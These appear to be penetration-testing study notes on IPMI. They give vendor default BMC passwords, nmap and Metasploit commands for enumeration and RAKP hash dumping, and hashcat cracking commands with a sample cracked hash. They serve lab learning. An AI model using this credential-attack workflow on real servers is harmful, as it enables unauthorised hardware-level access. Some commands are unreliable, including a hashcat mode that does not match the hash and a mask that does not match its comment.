# IPMI

IPMI = Intelligent Platform Management Interface

IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state.

Independant from BIOS, CPU, firmware and OS.

->  direct network connection to the system's hardware

Use-cases :
- Remote upgrades without physical access
- Before the OS has booted to modify BIOS settings
- When the host is fully powered down
- Access to a host after a system failure

Elements wich can be montor by IPMI : system temperature, voltage, fan status, and power supplies

IPMI requires the following components :
- Power source and LAN connection
- BMC : Micro-controller of IPMI
- ICMB : Interface of communication between 2 chassis
- IPMB : extension to BMC
- IPMI Memory : Store event logs, ...
- Communications Interfaces : Serial and LAN interfaces

Most commons BMCs : HP iLO, Dell DRAC, and Supermicro IPMI.

Port : UDP 623

# Configuration

Default passwords :
Dell iDRAC  ->  username = root             |   password = calvin
HP iLO	    ->  username = Administrator    |   random 8-char string of numbers and uppercase letters
Supermicro IPMI	-> username = ADMIN         |   password = ADMIN

# Footprinting the service


## Enumeration

sudo nmap -sU --script ipmi-version -p 623 $TARGET

sudo msfconsole
use auxiliary/scanner/ipmi/ipmi_version 
set rhosts 10.129.237.255


## Interaction

Flaw in the RAKP protocol in IPMI 2.0 : the server sends a salted SHA1 or MD5 of user's password

hashcat -m 0 02db722a94e01f2ec209dcb373981a6d079f81f2 /usr/share/wordlists/rockyou.txt


hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u



-> Try all combinations of upper case letters and numbers for an 9-char string

use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts
set OUTPUT_HASHCAT_FILE out.hashcat

hashcat -m 7300 out.hashcat -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u

admin:e3dd4a8b02030000c822288043a2dd3111111e810fcc876cf433ec48c96dcb167880e4426da1b897a123456789abcdefa123456789abcdef140561646d696e:124de895c9670ab41f93c09fcaab2f2ec1a0e8be

hashcat -m 7300 e3dd4a8b02030000c822288043a2dd3111111e810fcc876cf433ec48c96dcb167880e4426da1b897a123456789abcdefa123456789abcdef140561646d696e:124de895c9670ab41f93c09fcaab2f2ec1a0e8be /usr/share/wordlists/rockyou.txt

e3dd4a8b02030000c822288043a2dd3111111e810fcc876cf433ec48c96dcb167880e4426da1b897a123456789abcdefa123456789abcdef140561646d696e:124de895c9670ab41f93c09fcaab2f2ec1a0e8be:trinity
